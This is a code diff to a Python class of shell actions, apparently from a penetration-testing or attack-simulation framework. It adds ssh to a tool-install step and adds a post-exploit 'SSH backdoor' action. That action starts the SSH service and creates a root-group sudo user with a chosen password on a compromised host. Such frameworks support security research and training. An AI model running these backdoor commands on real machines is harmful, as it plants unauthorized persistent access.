@@ -19,9 +19,20 @@ class ShellActions:
     @staticmethod
     def INSTALL_TOOLS(index: int) -> Action:
         id = ActionId.INSTALL_TOOLS
-        cmd = ["sudo apt-get -y install nmap"]
+        cmd = ["sudo apt-get -y install nmap ssh"]
         return Action(id=id, name="Install tools", cmd=cmd,
                       type=ActionType.POST_EXPLOIT,
                       descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
                       cost=0.0, noise=0.0, index=index,
-                      ip=None, subnet=False, action_outcome=ActionOutcome.FLAG, alt_cmd=None)
+                      ip=None, subnet=False, action_outcome=ActionOutcome.PIVOTING, alt_cmd=None)
+
+    @staticmethod
+    def SSH_BACKDOOR(index: int) -> Action:
+        id = ActionId.SSH_BACKDOOR
+        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"]
+        return Action(id=id, name="Install SSH backdoor", cmd=cmd,
+                      type=ActionType.POST_EXPLOIT,
+                      descr="If taken root on remote machine, installs a ssh backdoor, useful for upgrading telnet"
+                            "or weaker channels",
+                      cost=0.0, noise=0.0, index=index,
+                      ip=None, subnet=False, action_outcome=ActionOutcome.PIVOTING, alt_cmd=None)
